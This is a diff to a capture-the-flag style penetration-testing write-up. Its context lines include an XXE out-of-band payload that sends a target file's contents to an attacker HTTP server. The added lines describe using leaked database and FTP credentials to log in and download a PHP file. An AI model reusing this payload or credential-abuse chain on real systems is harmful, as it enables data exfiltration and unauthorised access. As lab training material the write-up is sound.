@@ -151,6 +151,17 @@ It is confirmed that there is one user that has bash shell excluding root user, 
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.155:8000/?p=%file;'>">
 ```
 <img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/abcd3248-d89e-4fa5-baba-66ffd5e0e0e1" />
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/7840afc1-0260-412d-887a-52ffc7025f34" />
+
+<br>
+
+It is discovered that the file contains `DB_PASSWORD` and `FTP_USER`, `FTP_PASS`, which probably would allow attacker to login to internal FTP server. Attempting to login to FTP server was successful using credential above. Roaming inside FTP server, under the `blog` directory, `send_email.php` was found. By using `get` command, the file was successfully copied into the attacker's local server:
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/f971f6d7-a086-41de-be14-1d5236ea195d" />
+
+<br>
+
+
+
 
 
 
